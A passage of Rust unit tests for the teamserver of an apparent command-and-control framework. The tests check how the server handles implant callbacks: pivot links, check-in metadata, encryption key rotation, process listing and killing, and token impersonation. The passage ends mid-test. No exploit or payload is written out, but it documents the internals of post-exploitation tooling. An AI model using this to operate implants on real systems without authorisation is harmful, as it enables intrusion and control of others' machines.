        let msg_text = msg.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(
            msg_text.contains("Failed to connect"),
            "message must mention failure: {:?}",
            msg_text
        );
        assert!(
            msg_text.contains("[5]"),
            "message must include numeric error code: {:?}",
            msg_text
        );
        let kind = msg.info.extra.get("Type").and_then(|v| v.as_str()).unwrap_or("");
        assert_eq!(kind, "Error", "message type must be Error");
        let request_id_str = msg.info.extra.get("RequestID").and_then(|v| v.as_str()).unwrap_or("");
        assert_eq!(request_id_str, "63", "request id must be 99 in hex");
        Ok(())
    }

    fn pivot_disconnect_failure_payload(child_agent_id: u32) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&u32::from(DemonPivotCommand::SmbDisconnect).to_le_bytes());
        payload.extend_from_slice(&0_u32.to_le_bytes()); // success == 0
        payload.extend_from_slice(&child_agent_id.to_le_bytes());
        payload
    }

    #[tokio::test]
    async fn pivot_disconnect_callback_failure_broadcasts_error_event()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let parent_id = 0xABCD_1234_u32;
        let child_id = 0x5678_EF01_u32;
        let parent_key = [0xCC; AGENT_KEY_LENGTH];
        let parent_iv = [0xDD; AGENT_IV_LENGTH];
        registry
            .insert_with_listener(sample_agent_info(parent_id, parent_key, parent_iv), "smb-test")
            .await?;

        let response = dispatcher
            .dispatch(
                parent_id,
                u32::from(DemonCommand::CommandPivot),
                42,
                &pivot_disconnect_failure_payload(child_id),
            )
            .await?;

        assert_eq!(response, None, "failure path should return no agent response bytes");

        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "expected an operator event after pivot disconnect failure")?;
        let OperatorMessage::AgentResponse(msg) = event else {
            return Err(format!("expected AgentResponse, got {event:?}").into());
        };
        assert_eq!(
            msg.info.demon_id,
            format!("{parent_id:08X}"),
            "event must be for the parent agent"
        );
        let msg_text = msg.info.extra.get("Message").and_then(|v| v.as_str()).unwrap_or("");
        assert!(
            msg_text.contains("Failed to disconnect"),
            "message must mention disconnect failure: {:?}",
            msg_text
        );
        assert!(
            msg_text.contains(&format!("{child_id:08X}")),
            "message must include child agent id: {:?}",
            msg_text
        );
        let kind = msg.info.extra.get("Type").and_then(|v| v.as_str()).unwrap_or("");
        assert_eq!(kind, "Error", "message type must be Error");
        Ok(())
    }

    fn pivot_list_payload(entries: &[(u32, &str)]) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&u32::from(DemonPivotCommand::List).to_le_bytes());
        for (demon_id, pipe_name) in entries {
            payload.extend_from_slice(&demon_id.to_le_bytes());
            let utf16: Vec<u16> = pipe_name.encode_utf16().collect();
            let utf16_bytes: Vec<u8> = utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
            let len = u32::try_from(utf16_bytes.len()).unwrap_or_default();
            payload.extend_from_slice(&len.to_le_bytes());
            payload.extend_from_slice(&utf16_bytes);
        }
        payload
    }

    #[tokio::test]
    async fn pivot_list_callback_demon_id_is_zero_padded_on_left()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let agent_id = 0xAAAA_BBBB;
        let key = [0x11; AGENT_KEY_LENGTH];
        let iv = [0x22; AGENT_IV_LENGTH];
        registry.insert(sample_agent_info(agent_id, key, iv)).await?;

        // demon_id = 0x1 is only 1 hex digit — must be padded to "00000001", not "10000000"
        let response = dispatcher
            .dispatch(
                agent_id,
                u32::from(DemonCommand::CommandPivot),
                100,
                &pivot_list_payload(&[(0x1, "\\\\.\\pipe\\test")]),
            )
            .await?;

        assert_eq!(response, None);
        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "expected AgentResponse event after pivot list".to_owned())?;
        let OperatorMessage::AgentResponse(msg) = event else {
            return Err("expected AgentResponse".into());
        };
        let output = &msg.info.output;
        assert!(
            output.contains("00000001"),
            "demon id 0x1 must be right-aligned zero-padded to '00000001', got: {output}"
        );
        assert!(
            !output.contains("10000000"),
            "demon id 0x1 must NOT be left-aligned to '10000000', got: {output}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn pivot_list_callback_with_entries_broadcasts_formatted_table()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let agent_id = 0xAAAA_BBBB;
        let key = [0x11; AGENT_KEY_LENGTH];
        let iv = [0x22; AGENT_IV_LENGTH];
        registry.insert(sample_agent_info(agent_id, key, iv)).await?;

        let response = dispatcher
            .dispatch(
                agent_id,
                u32::from(DemonCommand::CommandPivot),
                99,
                &pivot_list_payload(&[
                    (0x1234_5678, "\\\\.\\pipe\\foo"),
                    (0xDEAD_BEEF, "\\\\.\\pipe\\bar"),
                ]),
            )
            .await?;

        assert_eq!(response, None);
        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "expected AgentResponse event after pivot list".to_owned())?;
        let OperatorMessage::AgentResponse(msg) = event else {
            return Err("expected AgentResponse".into());
        };
        assert_eq!(msg.info.demon_id, format!("{agent_id:08X}"));
        assert_eq!(msg.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        let message = msg.info.extra.get("Message").and_then(Value::as_str).unwrap_or("");
        assert!(message.contains("Pivot List [2]"), "message: {message}");
        let output = &msg.info.output;
        assert!(output.contains("12345678"), "output: {output}");
        assert!(output.contains("pipe\\foo"), "output: {output}");
        assert!(output.contains("deadbeef"), "output: {output}");
        assert!(output.contains("pipe\\bar"), "output: {output}");
        Ok(())
    }

    #[tokio::test]
    async fn pivot_list_callback_empty_broadcasts_no_pivots_message()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let agent_id = 0xCCCC_DDDD;
        let key = [0x33; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        registry.insert(sample_agent_info(agent_id, key, iv)).await?;

        let response = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandPivot), 77, &pivot_list_payload(&[]))
            .await?;

        assert_eq!(response, None);
        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "expected AgentResponse event after empty pivot list".to_owned())?;
        let OperatorMessage::AgentResponse(msg) = event else {
            return Err("expected AgentResponse".into());
        };
        assert_eq!(msg.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        assert_eq!(
            msg.info.extra.get("Message"),
            Some(&Value::String("No pivots connected".to_owned()))
        );
        assert!(
            msg.info.output.is_empty(),
            "output should be empty for no pivots: {}",
            msg.info.output
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_updates_last_call_in_and_broadcasts()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        let before = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist before checkin".to_owned())?
            .last_call_in;

        let response =
            dispatcher.dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &[]).await?;

        assert_eq!(response, None);

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist after checkin".to_owned())?;
        assert_ne!(updated.last_call_in, before);

        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "agent update event should be broadcast".to_owned())?;
        let OperatorMessage::AgentUpdate(message) = event else {
            panic!("unexpected operator event");
        };
        assert_eq!(message.info.agent_id, format!("{agent_id:08X}"));
        assert_eq!(message.info.marked, "Alive");
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_rejects_truncated_metadata_payload()
    -> Result<(), Box<dyn std::error::Error>> {
        // Any non-empty payload shorter than the 48-byte metadata prefix must be rejected
        // as a protocol error — not silently accepted as a heartbeat.
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;

        // Test a range of truncated payload lengths: 1 byte, the boundary-minus-one (47 bytes),
        // and a mid-range value.
        for truncated_len in [1_usize, 16, 47] {
            let truncated_payload = vec![0xAA; truncated_len];
            let err = dispatcher
                .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &truncated_payload)
                .await
                .expect_err("truncated CHECKIN payload must be rejected");
            assert!(
                matches!(
                    err,
                    CommandDispatchError::InvalidCallbackPayload { command_id, .. }
                    if command_id == u32::from(DemonCommand::CommandCheckin)
                ),
                "expected InvalidCallbackPayload for {truncated_len}-byte payload, got {err:?}"
            );
        }
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_truncated_payload_does_not_mutate_state()
    -> Result<(), Box<dyn std::error::Error>> {
        // A truncated CHECKIN must not update last_call_in or broadcast any event.
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        let before = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist before checkin".to_owned())?
            .last_call_in;

        let truncated_payload = vec![0xAA; 10];
        let _ = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &truncated_payload)
            .await
            .expect_err("truncated CHECKIN payload must be rejected");

        let after = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should still exist after rejected checkin".to_owned())?
            .last_call_in;

        assert_eq!(before, after, "last_call_in must not change on rejected truncated CHECKIN");
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "rejected truncated CHECKIN must not broadcast an agent update event"
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_refreshes_metadata_and_transport_state()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let refreshed_key = [0x12; AGENT_KEY_LENGTH];
        let refreshed_iv = [0x34; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        registry.set_ctr_offset(agent_id, 7).await?;
        let payload = sample_checkin_metadata_payload(agent_id, refreshed_key, refreshed_iv);

        let response = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &payload)
            .await?;

        assert_eq!(response, None);

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist after metadata-bearing checkin".to_owned())?;
        assert_eq!(updated.hostname, "wkstn-02");
        assert_eq!(updated.username, "svc-op");
        assert_eq!(updated.domain_name, "research");
        assert_eq!(updated.internal_ip, "10.10.10.50");
        assert_eq!(updated.process_name, "cmd.exe");
        assert_eq!(updated.process_path, "C:\\Windows\\System32\\cmd.exe");
        assert_eq!(updated.process_pid, 4040);
        assert_eq!(updated.process_tid, 5050);
        assert_eq!(updated.process_ppid, 3030);
        assert_eq!(updated.process_arch, "x86");
        assert!(!updated.elevated);
        assert_eq!(updated.base_address, 0x401000);
        assert_eq!(updated.os_version, "Windows 11");
        assert_eq!(updated.os_arch, "x64/AMD64");
        assert_eq!(updated.sleep_delay, 45);
        assert_eq!(updated.sleep_jitter, 5);
        assert_eq!(updated.kill_date, Some(1_725_000_000));
        assert_eq!(updated.working_hours, Some(0x00FF_00FF));
        // Key rotation from CHECKIN is rejected — original key material must be preserved.
        assert_eq!(updated.encryption.aes_key.as_slice(), key.as_slice());
        assert_eq!(updated.encryption.aes_iv.as_slice(), iv.as_slice());
        // CTR offset must not be reset when rotation is refused.
        assert_eq!(registry.ctr_offset(agent_id).await?, 7);

        let persisted = database
            .agents()
            .get(agent_id)
            .await?
            .ok_or_else(|| "agent should be persisted after checkin".to_owned())?;
        assert_eq!(persisted, updated);

        let event = receiver
            .recv()
            .await
            .ok_or_else(|| "agent update event should be broadcast".to_owned())?;
        let OperatorMessage::AgentUpdate(message) = event else {
            panic!("unexpected operator event");
        };
        assert_eq!(message.info.agent_id, format!("{agent_id:08X}"));
        assert_eq!(message.info.marked, "Alive");
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_rejects_key_rotation_and_preserves_ctr_offset()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let original_key = [0x77; AGENT_KEY_LENGTH];
        let original_iv = [0x44; AGENT_IV_LENGTH];
        let attempted_key = [0x12; AGENT_KEY_LENGTH];
        let attempted_iv = [0x34; AGENT_IV_LENGTH];
        let agent_id = 0x1020_304A;
        let pre_checkin_plaintext = b"advance shared ctr state";
        let post_checkin_plaintext = b"sleep 45 5";

        registry.insert(sample_agent_info(agent_id, original_key, original_iv)).await?;

        // Advance the CTR offset to a non-zero value before the CHECKIN.
        let pre_checkin_ciphertext =
            encrypt_agent_data_at_offset(&original_key, &original_iv, 0, pre_checkin_plaintext)?;
        assert_eq!(
            registry.decrypt_from_agent(agent_id, &pre_checkin_ciphertext).await?,
            pre_checkin_plaintext
        );
        let advanced_offset = registry.ctr_offset(agent_id).await?;
        assert_eq!(advanced_offset, ctr_blocks_for_len(pre_checkin_ciphertext.len()));
        assert!(advanced_offset > 0);

        // Dispatch a CHECKIN that attempts to rotate to a different key.
        let payload = sample_checkin_metadata_payload(agent_id, attempted_key, attempted_iv);
        let response = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &payload)
            .await?;
        assert_eq!(response, None);

        // The rotation must be refused: CTR offset preserved, original key still active.
        assert_eq!(registry.ctr_offset(agent_id).await?, advanced_offset);
        assert_eq!(
            registry.get(agent_id).await.unwrap().encryption.aes_key.as_slice(),
            original_key.as_slice()
        );
        assert_eq!(
            registry.get(agent_id).await.unwrap().encryption.aes_iv.as_slice(),
            original_iv.as_slice()
        );

        // Subsequent encryption must still use the original key at the preserved offset.
        let post_checkin_ciphertext =
            registry.encrypt_for_agent(agent_id, post_checkin_plaintext).await?;
        assert_eq!(
            post_checkin_ciphertext,
            encrypt_agent_data_at_offset(
                &original_key,
                &original_iv,
                advanced_offset,
                post_checkin_plaintext,
            )?
        );
        // Must NOT encrypt with the attempted rotated key.
        assert_ne!(
            post_checkin_ciphertext,
            encrypt_agent_data_at_offset(&attempted_key, &attempted_iv, 0, post_checkin_plaintext)?
        );

        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_rejects_kill_date_exceeding_i64_range()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let refreshed_key = [0x12; AGENT_KEY_LENGTH];
        let refreshed_iv = [0x34; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3041;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        registry.set_ctr_offset(agent_id, 7).await?;
        let payload = sample_checkin_metadata_payload_with_kill_date_and_working_hours(
            agent_id,
            refreshed_key,
            refreshed_iv,
            i64::MAX as u64 + 1,
            0x00FF_00FF,
        );

        let error = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &payload)
            .await
            .expect_err("overflowing kill date checkin must be rejected");

        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload { command_id, ref message }
                if command_id == u32::from(DemonCommand::CommandCheckin)
                    && message == "checkin kill date exceeds i64 range"
        ));
        assert_eq!(
            registry
                .get(agent_id)
                .await
                .ok_or_else(|| "agent should remain registered".to_owned())?
                .kill_date,
            None
        );
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "rejected checkin should not broadcast updates"
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_rejects_all_zero_rotated_aes_key_without_mutating_state()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let original_key = [0x77; AGENT_KEY_LENGTH];
        let original_iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3043;

        let original = sample_agent_info(agent_id, original_key, original_iv);
        registry.insert(original.clone()).await?;
        registry.set_ctr_offset(agent_id, 7).await?;

        let error = dispatcher
            .dispatch(
                agent_id,
                u32::from(DemonCommand::CommandCheckin),
                6,
                &sample_checkin_metadata_payload(
                    agent_id,
                    [0; AGENT_KEY_LENGTH],
                    [0x34; AGENT_IV_LENGTH],
                ),
            )
            .await
            .expect_err("all-zero key rotation must be rejected");

        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload { command_id, ref message }
                if command_id == u32::from(DemonCommand::CommandCheckin)
                    && message == "all-zero AES key is not allowed"
        ));

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should remain registered after rejected checkin".to_owned())?;
        assert_eq!(updated, original);
        assert_eq!(registry.ctr_offset(agent_id).await?, 7);

        let persisted = database
            .agents()
            .get(agent_id)
            .await?
            .ok_or_else(|| "agent should remain persisted after rejected checkin".to_owned())?;
        assert_eq!(persisted, original);

        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "rejected checkin should not broadcast updates"
        );

        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_rejects_all_zero_rotated_aes_iv_without_mutating_state()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let original_key = [0x77; AGENT_KEY_LENGTH];
        let original_iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3044;

        let original = sample_agent_info(agent_id, original_key, original_iv);
        registry.insert(original.clone()).await?;
        registry.set_ctr_offset(agent_id, 7).await?;

        let error = dispatcher
            .dispatch(
                agent_id,
                u32::from(DemonCommand::CommandCheckin),
                6,
                &sample_checkin_metadata_payload(
                    agent_id,
                    [0x55; AGENT_KEY_LENGTH],
                    [0; AGENT_IV_LENGTH],
                ),
            )
            .await
            .expect_err("all-zero IV rotation must be rejected");

        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload { command_id, ref message }
                if command_id == u32::from(DemonCommand::CommandCheckin)
                    && message == "all-zero AES IV is not allowed"
        ));

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should remain registered after rejected checkin".to_owned())?;
        assert_eq!(updated, original);
        assert_eq!(registry.ctr_offset(agent_id).await?, 7);

        let persisted = database
            .agents()
            .get(agent_id)
            .await?
            .ok_or_else(|| "agent should remain persisted after rejected checkin".to_owned())?;
        assert_eq!(persisted, original);

        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "rejected checkin should not broadcast updates"
        );

        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_returns_agent_not_found_for_unknown_agent()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);
        let agent_id = 0x1020_3042;

        let error = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &[0xAA, 0xBB])
            .await
            .expect_err("unknown agent checkin should fail");

        assert!(matches!(
            error,
            CommandDispatchError::Registry(TeamserverError::AgentNotFound { agent_id: missing_id })
                if missing_id == agent_id
        ));
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "unknown agent checkin should not broadcast an event"
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_preserves_high_bit_working_hours()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let refreshed_key = [0x12; AGENT_KEY_LENGTH];
        let refreshed_iv = [0x34; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3041;
        let working_hours = 0x8000_002A;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        let payload = sample_checkin_metadata_payload_with_working_hours(
            agent_id,
            refreshed_key,
            refreshed_iv,
            working_hours,
        );

        let response = dispatcher
            .dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 7, &payload)
            .await?;

        assert_eq!(response, None);

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "agent should exist after metadata-bearing checkin".to_owned())?;
        assert_eq!(updated.working_hours, Some(i32::from_be_bytes(working_hours.to_be_bytes())));

        let persisted = database
            .agents()
            .get(agent_id)
            .await?
            .ok_or_else(|| "agent should be persisted after checkin".to_owned())?;
        assert_eq!(persisted.working_hours, updated.working_hours);

        Ok(())
    }

    #[tokio::test]
    async fn builtin_checkin_handler_refuses_transport_rotation_for_pivoted_agents()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let parent_id = 0x4546_4748;
        let parent_key = [0x21; AGENT_KEY_LENGTH];
        let parent_iv = [0x31; AGENT_IV_LENGTH];
        let agent_id = 0x5152_5354;
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let rotated_key = [0x12; AGENT_KEY_LENGTH];
        let rotated_iv = [0x34; AGENT_IV_LENGTH];

        registry.insert(sample_agent_info(parent_id, parent_key, parent_iv)).await?;
        registry.insert_with_listener(sample_agent_info(agent_id, key, iv), "smb").await?;
        registry.add_link(parent_id, agent_id).await?;
        registry.set_ctr_offset(agent_id, 7).await?;

        let response = dispatcher
            .dispatch(
                agent_id,
                u32::from(DemonCommand::CommandCheckin),
                7,
                &sample_checkin_metadata_payload(agent_id, rotated_key, rotated_iv),
            )
            .await?;

        assert_eq!(response, None);

        let updated = registry
            .get(agent_id)
            .await
            .ok_or_else(|| "pivoted agent should exist after checkin".to_owned())?;
        assert_eq!(updated.hostname, "wkstn-02");
        assert_eq!(updated.encryption.aes_key.as_slice(), key.as_slice());
        assert_eq!(updated.encryption.aes_iv.as_slice(), iv.as_slice());
        assert_eq!(registry.ctr_offset(agent_id).await?, 7);

        let persisted = database
            .agents()
            .get(agent_id)
            .await?
            .ok_or_else(|| "pivoted agent should remain persisted after checkin".to_owned())?;
        assert_eq!(persisted.encryption.aes_key.as_slice(), key.as_slice());
        assert_eq!(persisted.encryption.aes_iv.as_slice(), iv.as_slice());

        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_list_handler_broadcasts_formatted_agent_response()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, 0);
        add_utf16(&mut payload, "explorer.exe");
        add_u32(&mut payload, 1337);
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 512);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 17);
        add_utf16(&mut payload, "LAB\\operator");

        let response = dispatcher
            .dispatch(0xDEAD_BEEF, u32::from(DemonCommand::CommandProcList), 0x2A, &payload)
            .await?;
        assert_eq!(response, None);

        let event =
            receiver.recv().await.ok_or_else(|| "agent response event missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.demon_id, "DEADBEEF");
        assert_eq!(message.info.command_id, u32::from(DemonCommand::CommandProcList).to_string());
        assert!(message.info.output.contains("explorer.exe"));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Process List:".to_owned()))
        );
        let rows = message
            .info
            .extra
            .get("ProcessListRows")
            .and_then(Value::as_array)
            .ok_or_else(|| "structured process rows missing".to_owned())?;
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].get("PID"), Some(&Value::from(1337)));
        assert_eq!(rows[0].get("Name"), Some(&Value::String("explorer.exe".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_process_kill_and_token_handlers_broadcast_agent_responses()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let kill_payload = [
            u32::from(DemonProcessCommand::Kill).to_le_bytes(),
            1_u32.to_le_bytes(),
            4040_u32.to_le_bytes(),
        ]
        .concat();
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandProc), 7, &kill_payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "kill response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successfully killed process: 4040".to_owned()))
        );

        let token_payload =
            [u32::from(DemonTokenCommand::Impersonate).to_le_bytes(), 1_u32.to_le_bytes()].concat();
        let mut token_payload = token_payload;
        add_bytes(&mut token_payload, b"LAB\\svc");
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandToken), 8, &token_payload)
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "token response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successfully impersonated LAB\\svc".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_shellcode_handler_broadcasts_agent_response()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        dispatcher
